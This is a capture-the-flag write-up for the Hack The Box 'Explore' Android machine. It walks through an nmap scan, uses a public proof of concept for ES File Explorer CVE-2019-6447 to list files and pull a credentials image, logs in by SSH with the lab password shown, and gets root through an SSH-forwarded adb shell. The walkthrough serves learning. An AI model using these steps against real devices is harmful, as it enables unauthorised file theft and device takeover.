# explore

## nmap

```bash
# Nmap 7.91 scan initiated Mon Jun 28 10:11:48 2021 as: nmap -sV -sC -p- -oA nmap/explore explore.htb
Host: 10.129.174.21 (explore.htb) Status: Up
Host: 10.129.174.21 (explore.htb) Ports: 
2222/open/tcp//ssh//(protocol 2.0)/,
5555/filtered/tcp//freeciv///,
45799/open/tcp//unknown///,
59777/open/tcp//http//Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older/
Ignored State: closed (65531)
# Nmap done at Mon Jun 28 10:13:55 2021 -- 1 IP address (1 host up) scanned in 126.63 seconds

```

There are 4 ports open on host:

- 2222 ssh server
- 5555 common adb port
- 45799 unknown service
- 59777 that is an ES File Explorer

## ES File Explorer

ES File Explorer have a vulnerability that can lead to dump all files in the smartphone [CVE-2019-6447][1]
a POC can be find [here][2]

`python3 poc.py --cmd listFiles --ip 10.129.174.21` will give use the list of all file

```bash
[*] Executing command: listFiles on 10.129.174.21
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"storage", "time":"6/28/21 03:56:01 AM", "type":"folder", "size":"80.00 Bytes (80 Bytes)", }, 
{"name":"sepolicy", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"357.18 KB (365,756 Bytes)", }, 
{"name":"sdcard", "time":"4/21/21 02:12:29 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sbin", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"140.00 Bytes (140 Bytes)", }, 
{"name":"product", "time":"3/24/20 11:39:17 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"proc", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"plat_service_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"13.73 KB (14,057 Bytes)", }, 
{"name":"plat_seapp_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"1.28 KB (1,315 Bytes)", }, 
{"name":"plat_property_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"6.53 KB (6,687 Bytes)", }, 
{"name":"plat_hwservice_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"7.04 KB (7,212 Bytes)", }, 
{"name":"plat_file_contexts", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"23.30 KB (23,863 Bytes)", }, 
{"name":"oem", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"40.00 Bytes (40 Bytes)", }, 
{"name":"odm", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"220.00 Bytes (220 Bytes)", }, 
{"name":"mnt", "time":"6/28/21 03:55:58 AM", "type":"folder", "size":"240.00 Bytes (240 Bytes)", }, 
{"name":"init.zygote64_32.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"875.00 Bytes (875 Bytes)", }, 
{"name":"init.zygote32.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"511.00 Bytes (511 Bytes)", }, 
{"name":"init.usb.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"5.51 KB (5,646 Bytes)", }, 
{"name":"init.usb.configfs.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"7.51 KB (7,690 Bytes)", }, 
{"name":"init.superuser.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"582.00 Bytes (582 Bytes)", }, 
{"name":"init.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"29.00 KB (29,697 Bytes)", }, 
{"name":"init.environ.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"1.04 KB (1,064 Bytes)", }, 
{"name":"init.android_x86_64.rc", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"3.36 KB (3,439 Bytes)", }, 
{"name":"init", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"2.29 MB (2,401,264 Bytes)", }, 
{"name":"fstab.android_x86_64", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"753.00 Bytes (753 Bytes)", }, 
{"name":"etc", "time":"3/25/20 03:41:52 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"dev", "time":"6/28/21 03:55:59 AM", "type":"folder", "size":"2.64 KB (2,700 Bytes)", }, 
{"name":"default.prop", "time":"6/28/21 03:55:57 AM", "type":"file", "size":"1.09 KB (1,118 Bytes)", }, 
{"name":"data", "time":"3/15/21 04:49:09 PM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"d", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"config", "time":"6/28/21 03:55:58 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"charger", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"cache", "time":"6/28/21 03:55:58 AM", "type":"folder", "size":"120.00 Bytes (120 Bytes)", }, 
{"name":"bugreports", "time":"12/31/69 07:00:00 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"bin", "time":"3/25/20 12:26:22 AM", "type":"folder", "size":"8.00 KB (8,192 Bytes)", }, 
{"name":"acct", "time":"6/28/21 03:55:57 AM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", }
]
```

`python3 poc.py --cmd listPics --ip 10.129.174.21` will give us the list of all pics int the smartphone

```bash
[*] Executing command: listPics on 10.129.174.21
[*] Server responded with: 200

{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)"}
```

Let's steal the `creds.jpg` using `python3 poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.129.174.21`

![creds](images/creds.jpg)

using this creds: ***kristi:Kr1sT!5h@Rp3xPl0r3!*** we can login via ssh and get user flag in sdcard directory.

## Root

User kristi cannot become root using `su` but we can use the `adb shell` ([Android Debug Bridge][3]) to get a root shell. Port 5555 is filtered on device so we need to forward our port to the device to get a connection

`ssh -L 5555:localhost:5555 kristi@explore.htb -p 2222`

then `adb connect localhost:5555` and `adb shell`. Once in the adb shell type `su` and we are root. Now let's find the root flag: `find / -name root.txt 2>/dev/null` -> `/data/root.txt`.

![htbbadge](https://www.hackthebox.eu/badge/image/272787)
![achiv](https://www.hackthebox.eu/storage/achievements/f1e4d0f625f403a3ec49f808722956fc.png)

[//]: #links
[1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6447
[2]: https://github.com/fs0c131y/ESFileExplorerOpenPortVuln
[3]: https://developer.android.com/studio/command-line/adb
